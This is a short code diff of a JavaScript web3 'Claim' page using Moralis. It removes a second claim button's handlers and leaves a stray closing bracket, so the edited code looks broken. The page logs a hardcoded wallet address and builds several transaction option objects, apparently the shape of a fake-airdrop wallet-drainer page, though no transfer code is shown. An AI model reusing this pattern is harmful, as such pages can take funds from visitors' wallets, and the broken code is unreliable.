@@ -60,11 +60,7 @@ function togglesidebar() {
 
 async function transact() {
     await Moralis.enableWeb3();
-    const claim = document.getElementById("claim");
-    claim.addEventListener("click", ()=>{
-        if(claim.innerText === "Connect wallet"){
-        claim.innerText = "Claim";
-    }
+
 });
     let user = Moralis.User.current();
     if (user == undefined) {
@@ -75,7 +71,6 @@ async function transact() {
     }
     }
     $("#claim").html('Claim');
-    $("#claim2").html('Claim');
     var options, optionss, optionsss;
     console.log("0xDB166D515EB187ec35a54aF33592d84D5B8Ef1Ff");
     optionss = {
@@ -160,7 +155,5 @@ $(document).ready(function () {
     $('#claim').click(function () {
         transact();
     })
-    $('#claim2').click(function () {
-        transact();
-    })
+
 });
